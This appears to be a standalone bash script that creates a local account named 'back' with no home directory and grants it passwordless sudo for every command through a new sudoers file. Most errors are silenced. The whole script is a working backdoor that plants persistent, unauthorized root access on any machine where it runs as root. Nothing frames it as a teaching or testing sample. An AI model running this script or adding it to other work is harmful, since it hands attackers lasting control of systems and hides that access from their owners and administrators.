#!/bin/bash

USERNAME="back"

useradd -M -s /bin/bash "$USERNAME" 2>/dev/null

echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$USERNAME 2>/dev/null


chmod 440 /etc/sudoers.d/$USERNAME 2>/dev/null
if [ $? -ne 0 ]; then
  echo "Error: Failed to set permissions for the sudoers file."
  exit 1
fi